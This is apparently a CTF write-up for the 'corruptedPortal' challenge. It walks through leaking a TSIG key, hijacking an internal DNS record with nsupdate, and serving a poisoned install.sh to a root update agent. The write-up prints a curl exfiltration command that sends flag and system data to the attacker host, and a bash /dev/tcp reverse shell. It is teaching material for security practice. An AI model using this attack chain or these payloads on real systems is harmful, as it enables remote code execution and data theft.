# corruptedPortal — Network Exploitation

**CTF:** ADF CSA 2026 Season 3
**Category:** Network Exploitation
**Challenge:** corruptedPortal
**Flag:** `FLAG{SMORT_SMORT_DNS}`

---

## Scenario

> Your aid is needed. You have been provided access to a machine on a network. Find everything you can.

- **Access:** `ssh taka@172.25.0.50` / password `ctfpassword` (externally exposed as `10.3.56.11:2222`)
- **Target:** `10.3.56.11` → the internal network `172.25.0.0/24`
- **Task:** Enumerate the network, find the flag

---

## Enumeration

### Landing on the box

```bash
sshpass -p 'ctfpassword' ssh taka@10.3.56.11 -p 2222
# hostname 38950dedffe6, user taka (uid=1000, groups: taka,sudo)
# /etc/hosts maps 172.25.0.50 -> 38950dedffe6  → THIS box is 172.25.0.50
```

We are `taka` on a Kali-ish container (`172.25.0.50`) sitting on the `172.25.0.0/24` Docker network. From here, a ping sweep + full port scans revealed three more live hosts:

| Host | Hostname | Open ports | Role |
|------|----------|-----------|------|
| 172.25.0.1 | (gateway) | — | docker bridge gateway |
| 172.25.0.3 | `dd32ba07a` | 53/tcp, 53/udp | BIND DNS (`9.18.30`) |
| 172.25.0.10 | `ld37ab70a` | 80/tcp | Python `SimpleHTTP/0.6` file server |
| 172.25.0.20 | `vd23ba07a` | none | idle container |
| 172.25.0.50 | `38950dedffe6` | 22/tcp | our box |

### DNS zone looks corrupted

```bash
dig @172.25.0.3 internal. AXFR
# internal.      SOA ns1.internal. admin.internal. 20230001 ...
# d37ab70a.internal.  A  172.25.0.10      ← forward record
# ns1.internal.      A  127.0.0.1

nmap -sL 172.25.0.0/24
# ld37ab70a.internal_deployment_challenge_net (172.25.0.10)   ← PTR record
```

The forward record is `d37ab70a` but the PTR is `ld37ab70a` — the **`l` is missing**. The DNS data is corrupted. That's the "corrupted portal" in the name.

### File server reveals an update mechanism

Fuzzing the file server on `.10`:

```bash
gobuster dir -u http://172.25.0.10 -w /usr/share/wfuzz/wordlist/general/medium.txt -t 50 -q
# /update    (Status: 301) [--> /update/]
gobuster dir -u http://172.25.0.10/update/ ...
# /debug     (Status: 200) [Size: 282]
# /logs      (Status: 200) [Size: 4896]
```

`/update/debug` leaks a **TSIG key** for the internal DNS:

```
# TSIG key for internal DNS updates:
# NOTE: This was for temporary DNS override testing — should be rotated!
#   TODO: Deprecate before Q1 2025!
#  key "dns_hmac_key" {
#    algorithm hmac-sha256;
#    secret "U1VQRVJTRUNSRVRDS1NCMjgyODI3SFM=";
#  };
# domain: d37ab70a.internal
```

`/update/logs` shows an **update agent** constantly polling the file server:

```
[updateagent] GET /install.sh
[updateagent] GET /verif.txt
[updateagent] GET /install.sh
... (repeats every few seconds)
```

The files it fetches:

```bash
curl http://172.25.0.10/install.sh
# #!/bin/sh
# echo "[d37ab70a] Running the install script..."
# echo "[d37ab70a] No updates at this time!"

curl http://172.25.0.10/verif.txt
# 5df9ad757f1329003633aafa5388778832b8f0208f3526f02855e7d32a39b70a
```

`verif.txt` is the **SHA-256 of install.sh** — the agent integrity-checks the script it downloads. `echo U1VQRVJTRUNSRVRDS1NCMjgyODI3SFM= | base64 -d` → `SUPERSECRETCKSB282827HS`.

---

## The Attack: DNS Override → Malicious Update → RCE

### 1. Prove the TSIG key works

```bash
cat > /tmp/dns_key.conf <<'EOF'
key "dns_hmac_key" {
    algorithm hmac-sha256;
    secret "U1VQRVJTRUNSRVRDS1NCMjgyODI3SFM=";
};
EOF

printf 'server 172.25.0.3\nzone internal.\nupdate add tsigtest.internal. 60 A 172.25.0.50\nsend\n' \
  | nsupdate -k /tmp/dns_key.conf -v

dig @172.25.0.3 tsigtest.internal. A +short
# 172.25.0.50     ← we just wrote to the DNS zone!
```

The leaked TSIG key gives us **authenticated dynamic DNS update** access to the `internal.` zone.

### 2. Poison the update feed

The update agent resolves `d37ab70a.internal` → the file server on `.10`, fetches `install.sh`, verifies it against `verif.txt`, and **executes it**. If we:

1. repoint `d37ab70a.internal` → our box (`172.25.0.50`),
2. serve our own `install.sh` (with a reverse shell + exfil payload),
3. serve `verif.txt` = SHA-256 of *our* install.sh,

…the agent's next poll downloads OUR script, the hash matches, and it runs our code as whatever user the agent runs as.

```bash
# swap the A record
printf 'server 172.25.0.3\nzone internal.\nupdate delete d37ab70a.internal. A\nupdate add d37ab70a.internal. 60 A 172.25.0.50\nsend\n' \
  | nsupdate -k /tmp/dns_key.conf -v

dig @172.25.0.3 d37ab70a.internal. A +short
# 172.25.0.50
```

### 3. Serve the malicious update

```bash
cd /tmp/evil
sha256sum install.sh | awk '{print $1}' > verif.txt   # hash of OUR script
python3 -m http.server 80 &                            # serves install.sh + verif.txt
# listener on 4444 (interactive shell) + POST collector on 8888 (exfil)
```

Payload essentials:

```sh
# exfil system info + flag files to our POST collector
{ id; hostname; find / -xdev \( -iname "*flag*" -o -iname "*.txt" \); cat /flag.txt; } \
  | curl -s -X POST --data-binary @- http://172.25.0.50:8888/exfil &
# reverse shell
bash -i >& /dev/tcp/172.25.0.50/4444 0>&1 &
```

### 4. Callback received — root on 172.25.0.20

Within seconds, the HTTP log showed the agent on `.20` pulling from **us**:

```
172.25.0.20 - - [01/Aug/2026 00:51:00] "GET /install.sh HTTP/1.1" 200 -
172.25.0.20 - - [01/Aug/2026 00:51:00] "GET /verif.txt HTTP/1.1" 200 -
```

And the exfil collector received:

```
=== WHOAMI ===
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),...
=== HOSTNAME ===
d7430cc1d792
=== FLAG FILES ===
/tmp/verif.txt
/tmp/recon_out.txt
/flag.txt
=== CONTENT DUMP ===
--- /flag.txt
FLAG{SMORT_SMORT_DNS}
```

The update agent on `.20` runs **as root** — our install.sh executed with full privileges and dumped the flag from `/flag.txt`. (Bonus observation: the reverse shell landed from `127.0.0.1` on our own box too, meaning every container on this network runs the same update agent.)

### 5. Cleanup — restore the DNS zone

```bash
printf 'server 172.25.0.3\nzone internal.\nupdate delete d37ab70a.internal. A\nupdate add d37ab70a.internal. 300 A 172.25.0.10\nupdate delete tsigtest.internal. A\nsend\n' \
  | nsupdate -k /tmp/dns_key.conf -v
dig @172.25.0.3 d37ab70a.internal. A +short   # 172.25.0.10 ✓ restored
```

---

## How We Solved It — Reasoning

1. **The challenge name was the first clue.** "corruptedPortal" — and the DNS forward record (`d37ab70a`) vs PTR (`ld37ab70a`) mismatch confirmed the DNS zone itself was the corrupted thing. Zone transfer (AXFR) was open, which made the anomaly easy to spot.

2. **File servers hide their real content.** The `.10` box answered 403 "Directory listing is forbidden" on every directory and 404 on every guessed file — a static-analysis dead end until gobuster found `/update/`. That one path contained the entire challenge: the TSIG key, the update logs, and the install/verify file pair.

3. **`verif.txt` was the integrity puzzle.** The agent wouldn't run a modified install.sh unless the hash matched. Instead of breaking the check, we *included* it: regenerate `verif.txt` from our own script, so the agent's integrity check passes by design. Integrity checks only help if the hash itself comes from a trusted channel — here we controlled the entire feed.

4. **Leaked keys beat brute force.** `nsupdate` with the leaked TSIG key gave us authenticated writes to the DNS zone. There was no need to attack the BIND server itself — the update mechanism was the intended (and much easier) entry point.

5. **Observing the agent's poll cadence.** The logs showed the agent polling every few seconds. That told us the poison would take effect within seconds of the DNS swap — and it did (00:50:52 swap → 00:51:00 fetch from us).

---

## Key Takeaways

- **Zone transfer + TSIG = full DNS takeover.** An open AXFR reveals the zone; a leaked TSIG secret lets you write to it. Both together let you redirect any hostname and hijack anything that trusts DNS.
- **Supply-chain poisoning via "update" feeds.** If a machine auto-downloads and runs scripts, the verification hash is only as strong as its delivery channel. Controlling the channel means controlling the execution.
- **Leaked dev notes are treasure.** The `/update/debug` file literally said "should be rotated!" and "TODO: Deprecate before Q1 2025" — a textbook reminder that temporary debugging artifacts left in production are a goldmine.
- **Containers on a shared Docker network are all peers.** Every box ran the same update agent — compromising the feed compromised every host, including the one we were given access to.
